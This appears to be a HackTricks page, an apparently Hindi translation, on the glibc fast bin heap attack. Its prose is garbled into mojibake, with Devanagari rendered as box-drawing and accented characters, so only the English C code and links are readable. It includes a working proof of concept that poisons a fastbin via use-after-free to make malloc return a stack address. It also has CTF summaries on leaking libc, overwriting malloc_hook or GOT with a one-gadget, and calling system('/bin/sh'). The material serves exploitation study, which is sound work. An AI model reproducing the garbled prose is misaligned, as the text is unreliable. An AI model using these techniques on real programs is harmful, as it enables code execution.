# рддреЗрдЬ рдмрд┐рди рд╣рдорд▓рд╛

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## рдореМрд▓рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

рддреЗрдЬ рдмрд┐рди рдХреНрдпрд╛ рд╣реИ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕ рдкреЗрдЬ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:

{% content-ref url="bins-and-memory-allocations.md" %}
[bins-and-memory-allocations.md](bins-and-memory-allocations.md)
{% endcontent-ref %}

рдХреНрдпреЛрдВрдХрд┐ рддреЗрдЬ рдмрд┐рди рдПрдХрд▓ рд▓рд┐рдВрдХ рд╣реИ, рдЗрд╕рдореЗрдВ рдЕрдиреНрдп рдмрд┐рдиреЛрдВ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдХрдо рд╕реБрд░рдХреНрд╖рд╛ рд╣реИ рдФрд░ **рдХрд┐рд╕реА рднреА рдореБрдХреНрдд рддреЗрдЬ рдмрд┐рди рдЪрдВрдХ рдореЗрдВ рдПрдХ рдкрддреЗ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛** рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ рддрд╛рдХрд┐ **рдмрд╛рдж рдореЗрдВ рдХрд┐рд╕реА рднреА рдореЗрдореЛрд░реА рдкрддреЗ рдкрд░ рдЪрдВрдХ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред

рд╕рд╛рд░рд╛рдВрд╢ рдореЗрдВ:
```c
ptr0 = malloc(0x20);
ptr1 = malloc(0x20);

// Put them in fast bin (suppose tcache is full)
free(ptr0)
free(ptr1)

// Use-after-free
// Modify the address where the free chunk of ptr1 is pointing
*ptr1 = (unsigned long)((char *)&<address>);

ptr2 = malloc(0x20); // This will get ptr1
ptr3 = malloc(0x20); // This will get a chunk in the <address> which could be abuse to overwrite arbitrary content inside of it
```
{% endcode %}

рдЖрдк рдПрдХ рдкреВрд░реНрдг рдЙрджрд╛рд╣рд░рдг рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдмрд╣реБрдд рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рдХреЛрдб рд╣реИ [https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html](https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html):
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
puts("Today we will be discussing a fastbin attack.");
puts("There are 10 fastbins, which act as linked lists (they're separated by size).");
puts("When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.");
puts("Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are chunks in it).");
puts("(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)");
puts("\nThis attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake chunk we want to allocate.");
puts("Pointers in this linked list are allocated when we allocate a chunk of the size that corresponds to the fastbin.");
puts("So we will just allocate chunks from the fastbin after we edit a pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.\n");
puts("So the tl;dr objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.\n");

puts("Let's start, we will allocate three chunks of size 0x30\n");
unsigned long *ptr0, *ptr1, *ptr2;

ptr0 = malloc(0x30);
ptr1 = malloc(0x30);
ptr2 = malloc(0x30);

printf("Chunk 0: %p\n", ptr0);
printf("Chunk 1: %p\n", ptr1);
printf("Chunk 2: %p\n\n", ptr2);


printf("Next we will make an integer variable on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");

int stackVar = 0x55;

printf("Integer: %x\t @: %p\n\n", stackVar, &stackVar);

printf("Proceeding that I'm going to write just some data to the three heap chunks\n");

char *data0 = "00000000";
char *data1 = "11111111";
char *data2 = "22222222";

memcpy(ptr0, data0, 0x8);
memcpy(ptr1, data1, 0x8);
memcpy(ptr2, data2, 0x8);

printf("We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.\n");

printf("Chunk 0: %s\n", (char *)ptr0);
printf("Chunk 1: %s\n", (char *)ptr1);
printf("Chunk 2: %s\n\n", (char *)ptr2);

printf("Next we are going to free all three pointers. This will add all of them to the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.\n");

free(ptr0);
free(ptr1);
free(ptr2);

printf("Chunk0 @ 0x%p\t contains: %lx\n", ptr0, *ptr0);
printf("Chunk1 @ 0x%p\t contains: %lx\n", ptr1, *ptr1);
printf("Chunk2 @ 0x%p\t contains: %lx\n\n", ptr2, *ptr2);

printf("So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked list.\n\n");


printf("Now we will edit a freed chunk (specifically the second chunk \"Chunk 1\"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\n");
printf("We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\n\n");

*ptr1 = (unsigned long)((char *)&stackVar);

printf("We can see it's new value of Chunk1 @ %p\t hold: 0x%lx\n\n", ptr1, *ptr1);


printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.\n");
printf("When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\n\n");

unsigned long *ptr3, *ptr4, *ptr5;

ptr3 = malloc(0x30);
ptr4 = malloc(0x30);
ptr5 = malloc(0x30);

printf("Chunk 3: %p\n", ptr3);
printf("Chunk 4: %p\n", ptr4);
printf("Chunk 5: %p\t Contains: 0x%x\n", ptr5, (int)*ptr5);

printf("\n\nJust like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!\n");
}
```
{% hint style="danger" %}
рдпрджрд┐ рдЧреНрд▓реЛрдмрд▓ рд╡реЗрд░рд┐рдПрдмрд▓ **`global_max_fast`** рдХреА рдорд╛рди рдХреЛ рдПрдХ рдмрдбрд╝реА рд╕рдВрдЦреНрдпрд╛ рд╕реЗ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдмрдбрд╝реЗ рдЖрдХрд╛рд░ рдХреЗ рдлрд╛рд╕реНрдЯ рдмрд┐рди рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкрд╣рд▓реЗ рд╕рдВрднрд╛рд╡рдирд╛ рдирд╣реАрдВ рдереА рдХрд┐ рдЬрд╣рд╛рдВ рдЗрд╕реЗ рдкрд╣рд▓реЗ рд╕рдВрднрд╡ рдирд╣реАрдВ рдерд╛, рд╡рд╣рд╛рдВ рдлрд╛рд╕реНрдЯ рдмрд┐рди рд╣рдорд▓реЗ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

## рдЙрджрд╛рд╣рд░рдг

* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html)**:**
* рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЪрдВрдХреНрд╕ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП, рдЙрдиреНрд╣реЗрдВ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдП, рдЙрдирдХреА рд╕рд╛рдордЧреНрд░реА рдкрдврд╝реА рдЬрд╛рдП рдФрд░ рдЙрдиреНрд╣реЗрдВ рднрд░рд╛ рдЬрд╛рдП (рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рд╡рдВрд▓рд░реЗрдмрд┐рд▓рд┐рдЯреА рдХреЗ рд╕рд╛рде)ред
* **рдЗрдирдлреЛрд▓реАрдХ рдХреЗ рд▓рд┐рдП рдЪрдВрдХ рдХреЛ рд╕рдореЗрдЯреЗрдВ**: рддрдХрдиреАрдХ рдмреБрдирд┐рдпрд╛рджреА рд░реВрдк рд╕реЗ рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ рддрд╛рдХрд┐ рдПрдХ рдирдХрд▓реА рдкрд┐рдЫрд▓реЗ_рдЖрдХрд╛рд░ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ рддрд╛рдХрд┐ рдПрдХ рдмрдбрд╝реЗ рдЪрдВрдХ рдореЗрдВ рдПрдХ рдФрд░ рдЪрдВрдХ рдбрд╛рд▓рд╛ рдЬрд╛ рд╕рдХреЗ, рдЗрд╕рд▓рд┐рдП рдЬрдм рдПрдХ рдФрд░ рдЪрдВрдХ рд╡рд╛рд▓рд╛ рдмрдбрд╝рд╛ рдЪрдВрдХ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕рдХреА рдбреЗрдЯрд╛ рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдкрддрд╛ рд▓реАрдХ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ libc (main\_arena+88) рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рддрд╛ рд╣реИред
* **рдореИрд▓реЛрдХ рд╣реБрдХ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░реЗрдВ**: рдЗрд╕рдХреЗ рд▓рд┐рдП, рдФрд░ рдкрд┐рдЫрд▓реЗ рдУрд╡рд░рд▓реИрдкрд┐рдВрдЧ рд╕реНрдерд┐рддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╕рдВрднрд╡ рдерд╛ рдХрд┐ 2 рдЪрдВрдХреНрд╕ рд╣реЛрдВ рдЬреЛ рдПрдХ рд╣реА рдореЗрдореЛрд░реА рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░ рд░рд╣реЗ рдереЗред рдЗрд╕рд▓рд┐рдП, рдЙрдиреНрд╣реЗрдВ рджреЛрдиреЛрдВ рдореБрдХреНрдд рдХрд░рдирд╛ (рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░реЛрдЯреЗрдХреНрд╢рди рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рджреВрд╕рд░реЗ рдЪрдВрдХ рдХреЛ рдореБрдХреНрдд рдХрд░рдирд╛) рд╕рдВрднрд╡ рдерд╛ рдХрд┐ рдлрд╛рд╕реНрдЯ рдмрд┐рди рдореЗрдВ рдПрдХ рд╣реА рдЪрдВрдХ рдХреЛ 2 рдмрд╛рд░ рд╣реЛрдиреЗ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛ред рдлрд┐рд░, рдЗрд╕реЗ рдлрд┐рд░ рд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛, рдЕрдЧрд▓реЗ рдЪрдВрдХ рдХреЗ рдкрддреЗ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд┐рдЯ рдкрд╣рд▓реЗ malloc\_hook рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рддрд╛рдХрд┐ рдпрд╣ рдПрдХ рдирд┐:рд╢реБрд▓реНрдХ рдЖрдХрд╛рд░ рдорд╛рдирддрд╛ рд╣реИ - рдПрдХ рдФрд░ рдмрд╛рдпрдкрд╛рд╕), рдЗрд╕реЗ рдлрд┐рд░ рд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдирд╛ рдФрд░ рдлрд┐рд░ рдПрдХ рдЪрдВрдХ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдирд╛ рдЬреЛ malloc рд╣реБрдХреНрд╕ рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░реЗрдЧрд╛ред\
рдЕрдВрдд рдореЗрдВ рдПрдХ **рд╡рди рдЧреИрдЬреЗрдЯ** рд╡рд╣рд╛рдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рдерд╛ред
* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html)**:**
* рдпрд╣рд╛рдВ рдПрдХ рд╣реАрдк рдУрд╡рд░рдлреНрд▓реЛ рдФрд░ рдпреВрдЬрд╝рд░ рдЖрдлреНрдЯрд░ рдлреНрд░реА рдФрд░ рдбрдмрд▓ рдлреНрд░реА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЬрдм рдПрдХ рдЪрдВрдХ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХреЛ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдкреБрдирдГ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
* **Libc рдЗрдирдлреЛ рд▓реАрдХ**: рдХреБрдЫ рдЪрдВрдХреНрд╕ рдХреЛ рдореБрдХреНрдд рдХрд░реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдореБрдЦреНрдп рдПрд░рд┐рдирд╛ рд╕реНрдерд╛рди рдХреЗ рдПрдХ рд╣рд┐рд╕реНрд╕реЗ рдХрд╛ рдкреЙрдЗрдВрдЯрд░ рдорд┐рд▓реЗрдЧрд╛ред рдЬреИрд╕реЗ рд╣реА рдЖрдк рдореБрдХреНрдд рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХреЛ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдмрд╕ рдЗрд╕ рдкрддреЗ рдХреЛ рдкрдврд╝реЗрдВред
* **рдлрд╛рд╕реНрдЯ рдмрд┐рди рд╣рдорд▓рд╛**: рд╕рднреА рдЖрд╡рдВрдЯрди рдХреЗ рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХреЛ рдПрдХ рдЕрд░реНрд░реЗ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдо рдХреБрдЫ рдлрд╛рд╕реНрдЯ рдмрд┐рди рдЪрдВрдХреНрд╕ рдХреЛ рдореБрдХреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдВрддрд┐рдо рдЪрдВрдХ рдореЗрдВ рдПрдбреНрд░реЗрд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдЕрд░реНрд░реЗ рдХреЗ рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХреЗ рдПрдХ рдмрд┐рдЯ рдкрд╣рд▓реЗ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдлрд┐рд░, рдПрдХ рд╕рдорд╛рди рдЖрдХрд╛рд░ рдХреЗ рдХреБрдЫ рдЪрдВрдХреНрд╕ рдЖрд╡рдВрдЯрд┐рдд рдХрд░реЗрдВ рдФрд░ рд╣рдореЗрдВ рдкрд╣рд▓реЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЪрдВрдХ рдорд┐рд▓реЗрдЧрд╛ рдФрд░ рдлрд┐рд░ рдирдХрд▓реА рдЪрдВрдХ рдЬреЛ рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХреЗ рдЕрд░реНрд░реЗ рдХреЛ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░рддрд╛ рд╣реИред рдЕрдм рд╣рдо рдЗрд╕ рдЖрд╡рдВрдЯрди рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡рд╣ `free` рдХреЗ рдЧреЛрдЯ рдПрдбреНрд░реЗрд╕ рдХреЛ рд╕рд┐рд╕реНрдЯрдо рдкреЙрдЗрдВрдЯ рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ рдЪрдВрдХ 1 `"/bin/sh"` рд▓рд┐рдЦреЗрдВ рдлрд┐рд░ `free(chunk1)` рдХрд░реЗрдВ рдЬреЛ `system("/bin/sh")` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html)
* рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг рдЬрд╣рд╛рдВ 1B рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрд╕рдВрдЧрдард┐рдд рдмрд┐рди рдореЗрдВ рдЪрдВрдХреНрд╕ рдХреЛ рд╕рдореЗрдЯрдиреЗ рдФрд░ рдПрдХ libc рдЗрдирдлреЛрд▓реАрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдлрд┐рд░ рдПрдХ рдлрд╛рд╕реНрдЯ рдмрд┐рди рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП malloc рд╣реБрдХ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html)
* рдПрдХ рдЗрдирдлреЛрд▓реАрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЕрд╕рдВрдЧрдард┐рдд рдмрд┐рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд▓рд┐рдмреНрд╕ рдкрддрд╛ рдФрд░ рдПрдХ рдкрд╛рдИ рдкрддрд╛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЗрд╕ CTF рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдПрдХ рдлрд╛рд╕реНрдЯ рдмрд┐рди рд╣рдорд▓рд╛ рдПрдХ рдЪрдВрдХ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд╣рд╛рдВ рдирд┐рдпрдВрддреНрд░рд┐рдд рдЪрдВрдХреНрд╕ рдХреЗ рдкреЙрдЗрдВрдЯрд░реНрд╕ рд╕реНрдерд┐рдд рдереЗ рдЗрд╕рд▓рд┐рдП рдирд┐рд╢реНрдЪрд┐рдд рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рд╕рдВрднрд╡ рдерд╛ рдПрдХ рд╡рди рдЧреИрдЬреЗрдЯ рдЧреЛрдЯ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП
* рдЖрдк рдПрдХ рдлрд╛рд╕реНрдЯ рдмрд┐рди рд╣рдорд▓рд╛ рдЕрд╕рдВрдЧрдард┐рдд рдмрд┐рди рд╣рдорд▓реЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
* рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдлрд╛рд╕реНрдЯ рдмрд┐рди рд╣рдорд▓реЗ рдХреЛ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЕрд╕рдВрдЧрдард┐рдд рд╕реВрдЪреА рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рд╛рдорд╛рдиреНрдп рд╣реИ рддрд╛рдХрд┐ libc/рд╣реАрдк рдкрддреЛрдВ рдХреЛ рд▓реАрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ (рдЬрдм рдЖрд╡рд╢реНрдпрдХ рд╣реЛ)ред

{% content-ref url="unsorted-bin-attack.md" %}
[unsorted-bin-attack.md](unsorted-bin-attack.md)
{% endcontent-ref %}

<details>

<summary><strong>рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks** рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks** рдХреЛ **PDF** рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб рдЧрд┐рдЯрд╣рдм рд░реЗрдкреЛ рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
